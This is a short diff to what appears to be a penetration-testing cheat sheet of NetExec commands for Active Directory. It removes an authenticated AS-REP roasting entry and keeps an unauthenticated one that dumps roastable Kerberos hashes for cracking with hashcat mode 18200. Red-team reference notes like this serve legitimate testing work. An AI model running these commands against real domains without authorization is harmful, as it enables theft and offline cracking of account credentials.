@@ -241,15 +241,6 @@ Hashcat format  -m 18200
 nxc ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip>
 ```
 
-## nxc - ASREPRoast enum with authentication
-#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON  
-
-Hashcat format  -m 18200 
-
-```bash
-nxc ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip>
-```
-
 ## nxc - Kerberoasting
 #plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 
 
